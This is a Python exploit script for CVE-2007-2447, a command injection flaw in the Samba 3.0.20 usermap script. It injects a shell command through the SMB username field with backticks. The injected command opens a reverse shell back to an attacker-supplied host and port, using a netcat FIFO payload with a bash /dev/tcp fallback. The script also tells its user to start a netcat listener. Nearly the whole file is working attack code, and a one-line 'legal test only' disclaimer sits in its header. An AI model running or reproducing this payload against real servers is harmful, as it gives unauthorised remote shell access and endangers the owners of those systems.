#!/usr/bin/python3

################################################################################################
# Exploit script for Samba 3.0.20                                                              #
# If you use This script, then you need open up netcat in other terminal                       #
# If you hard for use this, then you should use metasploit and search samba 3.0.20             #
#                                                                                              #
# This script is for legal test only                                                           #
# so Do not use to disallowed network and server                                               #
#                                                                                              #
################################################################################################


import sys
from smb.SMBConnection import SMBConnection
import os

logo = """
   ________  ___  ___    ___      ___  _______   ___  ___      ________  ___________  _______   _______   
  /"      ")(: "||_  |  |"  \    /"  ||   _  "\ (: "||_  |    /"      ")("     _   ")/" __   ) /"      \  
 (:   //\_/ |  (__) :|   \   \  //   |(. |_)  :)|  (__) :|   (:   //\_/  )__/   l__/(__/ _) ./|:        | 
  \___ \     \____  ||   /    \/.    ||:     \/  \____  ||    \___ \        z_  /       /  // |_____/   ) 
  __ |  ;        _\ '|  |: \.        |(|  _   .'     _\ '|    __ |  '       |.  |    __ \_ ;  //      /  
 /" \/  :)      /" \_|\ |.  \    /:  ||: |_)  :)    /" \_|\  /" \/  :)      \:  |   (: \__) :\|:  __   \  
(_______/      (_______)|___|\__/|___|(_______/    (_______)(_______/        \__|    \_______)|__|  \___) 
                                                                                                          
[+]CVE-2007-2447 Samba usermap script
"""

if len(sys.argv) != 5:

    print("[!]Need More Args")
    print(f"[+]Usage  : {sys.argv[0]} <rhost> <rport> <lhost> <lport>")
    print(f"[+]Example: {sys.argv[0]} vuln.com 139 192.168.0.4 1337")
    sys.exit()

print(logo)

rhost = sys.argv[1]
rport = sys.argv[2]
lhost = sys.argv[3]
lport = sys.argv[4]


payload  = 'mkfifo /tmp/foo; nc ' + lhost + ' ' + lport + ' 0</tmp/foo | /bin/sh >/tmp/foo 2>&1; rm /tmp/foo'
payload2 = 'bash -i >& /dev/tcp/' + lhost + '/' + lport + ' 0>&1'

print("[+]open other terminal and press to below commands")
print(f"[+]Copy this->  nc -nlvp {lport}")

standby = input("press any key _ ")


        
try:
    username = "/=`nohup " + payload + "`"
    conn = SMBConnection(username,"","","")
    conn.connect(rhost, int(rport), timeout=1)
        
except:
    username = "/=`nohup " + payload2 + "`"
    conn = SMBConnection(username,"","","")
    conn.connect(rhost, int(rport), timeout=1)    

print("[*]Payload sent, check netcat")

